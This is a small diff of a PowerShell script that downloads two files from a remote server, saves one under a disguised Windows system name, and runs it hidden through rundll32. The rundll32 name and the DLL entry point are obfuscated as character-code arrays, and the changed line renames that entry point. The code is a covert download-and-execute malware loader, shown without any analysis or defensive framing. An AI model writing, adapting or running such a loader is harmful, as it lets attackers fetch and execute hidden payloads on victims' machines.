@@ -8,5 +8,5 @@ $wc.DownloadFile("$u/nlaapi.bin","$p\nlaapi.bin")
 $d="$p\wbemcomn.dat"
 $wc.DownloadFile("$u/svc.dat",$d)
 $e=-join[char[]](114,117,110,100,108,108,51,50,46,101,120,101)
-$m=-join[char[]](83,101,114,118,105,99,101,77,97,105,110)
+$m=-join[char[]](68,97,116,97,80,114,111,116,101,99,116,83,121,110,99)
 Start-Process $e "$d,$m" -WindowStyle Hidden
